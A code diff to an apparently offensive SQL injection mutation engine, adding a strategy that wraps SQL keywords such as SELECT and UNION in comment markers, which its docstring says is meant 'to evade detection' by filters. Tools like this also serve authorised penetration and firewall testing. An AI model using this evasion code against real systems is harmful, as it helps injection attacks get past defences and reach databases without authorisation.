@@ -13,7 +13,8 @@ class ASTMutator:
             "context_aware": self._context_aware_mutation,
             "directed_bypass": self._directed_keyword_mutation,
             "polyglot": self._polyglot_mutation,
-            "encoding": self._encoding_mutation
+            "encoding": self._encoding_mutation,
+            "keyword_comment_wrap": self._keyword_comment_wrap
         }
         # Awareness: Track success of each strategy
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
@@ -239,6 +240,25 @@ class ASTMutator:
         if "/**/" in payload:
             return payload.replace("/**/", f"/*{random.choice(junk)}*/")
         return payload
+
+    def _keyword_comment_wrap(self, payload):
+        """Wraps SQL keywords in various comment styles to evade detection."""
+        mutated = str(payload)
+        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
+        
+        for kw in keywords:
+            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
+                # Choose a random comment style
+                style = random.choice([
+                    lambda k: f"/*{random.choice(['!', 'x', 'bypass'])}*/{k}/*{random.choice(['!', 'x', 'bypass'])}*/",
+                    lambda k: f"{k}/*{random.choice(['!', 'x', 'bypass'])}*/",
+                    lambda k: f"/*{random.choice(['!', 'x', 'bypass'])}*/{k}",
+                    lambda k: f"--{random.choice(['!', 'x', 'bypass'])}\n{k}",
+                    lambda k: f"#{random.choice(['!', 'x', 'bypass'])}\n{k}"
+                ])
+                mutated = re.sub(rf'\b{kw}\b', style(kw), mutated, flags=re.IGNORECASE)
+                
+        return mutated
 
     def _context_aware_mutation(self, payload):
         mutated = str(payload)
